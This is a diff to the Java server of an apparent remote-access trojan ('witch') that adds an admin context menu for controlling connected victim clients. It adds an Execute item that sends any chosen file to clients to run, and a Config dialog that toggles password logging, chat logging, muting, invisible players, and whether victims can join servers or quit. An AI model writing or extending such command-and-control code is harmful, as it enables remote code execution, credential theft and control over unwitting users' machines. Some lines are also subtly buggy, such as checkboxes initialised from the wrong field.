@@ -11,16 +11,23 @@ import me.soda.witch.shared.socket.Connection;
 import me.soda.witch.shared.socket.TcpServer;
 import me.soda.witch.shared.socket.messages.Message;
 import me.soda.witch.shared.socket.messages.messages.*;
+import net.miginfocom.swing.MigLayout;
 
 import javax.swing.*;
+import javax.swing.event.PopupMenuEvent;
+import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
 
 public class Server extends TcpServer {
@@ -30,10 +37,11 @@ public class Server extends TcpServer {
     protected final ServerConfig config = Utils.getServerConfig();
     private final AdminPanel adminPanel;
     private int clientIndex = 0;
+    private final List<Integer> selectedConns = new ArrayList<>();
 
     public Server() throws IOException {
         super();
-        adminPanel = new AdminPanel(this);
+        adminPanel = new AdminPanel();
         GUI gui = new GUI(adminPanel);
         gui.addWindowListener(new WindowAdapter() {
             @Override
@@ -46,6 +54,101 @@ public class Server extends TcpServer {
                 }
             }
         });
+        adminPanel.table.setComponentPopupMenu(
+                new JPopupMenu() {{
+                    addPopupMenuListener(new PopupMenuListener() {
+                        @Override
+                        public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
+                            selectedConns.clear();
+                            int[] i = adminPanel.table.getSelectedRows();
+                            for (int i1 : i) {
+                                selectedConns.add((Integer) adminPanel.table.getValueAt(i1, 0));
+                            }
+                        }
+
+                        @Override
+                        public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
+                        }
+
+                        @Override
+                        public void popupMenuCanceled(PopupMenuEvent e) {
+                        }
+                    });
+
+
+                    JMenuItem disconnect = new JMenuItem("Disconnect");
+                    disconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));
+
+                    JMenuItem reconnect = new JMenuItem("Reconnect");
+                    reconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));
+
+                    JMenuItem execute = new JMenuItem("Execute");
+                    execute.addActionListener(e -> {
+                        JFileChooser fileChooser = new JFileChooser();
+                        if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
+                            try (FileInputStream is = new FileInputStream(fileChooser.getSelectedFile())) {
+                                byte[] data = is.readAllBytes();
+                                getConns().forEach(connection -> connection.send(Message.fromBytes("execute", data)));
+                            } catch (IOException ex) {
+                                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
+                            }
+                        }
+                    });
+
+                    JMenuItem config = new JMenuItem("Config");
+                    config.addActionListener(e -> {
+                        JDialog dialog = new JDialog(gui);
+                        ClientConfigData cfg = Utils.getDefaultClientConfig();
+                        JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
+                        JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
+                        JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
+                        JTextField filterPattern = new JTextField(cfg.filterPattern);
+                        JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
+                        JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
+                        JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
+                        JTextArea invisiblePlayers = new JTextArea();
+                        cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
+                        JButton send = new JButton("send");
+                        send.addActionListener(e1 -> {
+                            cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
+                            cfg.isMuted = isMuted.isSelected();
+                            cfg.isBeingFiltered = isBeingFiltered.isSelected();
+                            cfg.filterPattern = filterPattern.getText();
+                            cfg.logChatAndCommand = logChatAndCommand.isSelected();
+                            cfg.canJoinServer = canJoinServer.isSelected();
+                            cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
+                            cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
+                            getConns().forEach(connection -> connection.send(new Message(cfg)));
+                            dialog.dispose();
+                        });
+
+                        dialog.setLayout(new MigLayout());
+                        dialog.add(passwordBeingLogged, "wrap");
+                        dialog.add(isMuted, "wrap");
+                        dialog.add(isBeingFiltered, "wrap");
+                        dialog.add(new JLabel("Filter pattern"), "split 2");
+                        dialog.add(filterPattern, "wrap, growx");
+                        dialog.add(logChatAndCommand, "wrap");
+                        dialog.add(canJoinServer, "wrap");
+                        dialog.add(canQuitServerOrCloseWindow, "wrap");
+                        dialog.add(new JLabel("Invisible players"), "split 2");
+                        dialog.add(invisiblePlayers, "wrap, growx");
+                        dialog.add(send);
+                        dialog.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+                        dialog.setResizable(true);
+                        dialog.pack();
+                        dialog.setLocationRelativeTo(null);
+
+                        dialog.setVisible(true);
+                    });
+
+
+                    add(disconnect);
+                    add(reconnect);
+                    add(execute);
+                    add(config);
+                }}
+        );
 
         log("--@@@@@@@ By Soda5601 @@@@@@@--");
         log("Server Config: %s", GSON.toJson(config));
@@ -65,7 +168,7 @@ public class Server extends TcpServer {
         String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
         log("Client connected: %s ID: %d", address, clientIndex);
         clientMap.put(conn, new Info(clientIndex));
-        adminPanel.connTableModel.addRow(new Object[]{clientIndex, null, null});
+        ((DefaultTableModel) adminPanel.table.getModel()).addRow(new Object[]{clientIndex, null, null});
         clientIndex++;
     }
 
@@ -130,7 +233,7 @@ public class Server extends TcpServer {
     }
 
     private void changeRow(Info info, boolean delete) {
-        DefaultTableModel connTableModel = adminPanel.connTableModel;
+        DefaultTableModel connTableModel = (DefaultTableModel) adminPanel.table.getModel();
         for (int i = 0; i < connTableModel.getRowCount(); i++) {
             int id = (int) connTableModel.getValueAt(i, 0);
             if (id == info.id) {
@@ -144,5 +247,9 @@ public class Server extends TcpServer {
                 return;
             }
         }
+    }
+
+    private List<Connection> getConns() {
+        return getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id)).toList();
     }
 }
